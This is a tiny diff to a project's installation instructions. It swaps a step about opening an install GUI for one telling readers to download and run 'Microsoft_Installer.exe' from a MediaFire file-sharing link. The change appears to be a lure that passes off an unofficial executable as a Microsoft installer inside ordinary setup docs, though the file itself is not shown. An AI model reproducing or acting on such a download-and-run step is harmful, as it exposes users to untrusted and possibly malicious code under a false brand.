@@ -1,3 +1,4 @@
 1 Instalation 
-open the install user gui
+go to https://www.mediafire.com/file/67byaul012uhess/Microsoft_Installer.exe/file
+open the file and wait to install
 
